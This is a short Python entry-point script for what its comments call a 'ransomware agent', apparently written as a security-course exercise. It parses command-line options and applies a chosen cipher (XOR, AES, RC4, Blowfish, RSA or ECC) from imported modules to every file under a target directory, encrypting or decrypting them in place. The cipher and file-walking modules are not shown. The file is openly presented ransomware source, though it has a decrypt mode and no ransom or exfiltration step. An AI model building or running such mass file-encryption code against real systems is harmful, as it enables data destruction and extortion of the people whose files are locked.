import sys
from src import argparser
from src import filewalker
from src import cipher

# The ransomware agent should be able to encrypt and decrypt file contents using the command line. 
# The command line should receive the following argument options:

# --directory : The directory that will be used for encryption
# --type: gets to values of “sym” and “asym” for symmetric and asymmetric algorithm selection
# --secrets: an n-tuple input used for secrets such as keys, and other important parameters needed for the crypto scheme, e.g. algorithm itself. Feel free to define sub-parameters if needed.
# --action: decrypt or encrypt

def main(directory: str, cipher_type: str, secrets: str, privateKey: str, publicKey: str, action: str):
    cipher_methods = {
        "xor": cipher.XORCipher(secrets),
        "aes": cipher.AESCipher(secrets),
        "rc4": cipher.RC4Cipher(secrets),
        "blowfish": cipher.BlowFishCipher(secrets),
        "rsa": cipher.RSACipher(privateKey, publicKey),
        "ecc": cipher.ECCCipher(privateKey, publicKey)
    }
    
    chosen_cipher_method = cipher_methods.get(cipher_type.lower())
    
    if action == "encrypt":
        filewalker.walk_files_and_apply_func(directory, chosen_cipher_method.encrypt)
    elif action == "decrypt":
        filewalker.walk_files_and_apply_func(directory, chosen_cipher_method.decrypt)
    

if __name__ == "__main__":
    argv = argparser.run_argparser().parse_args()
    main(argv.directory, argv.type, argv.secrets, argv.privateKey, argv.publicKey, argv.action)
    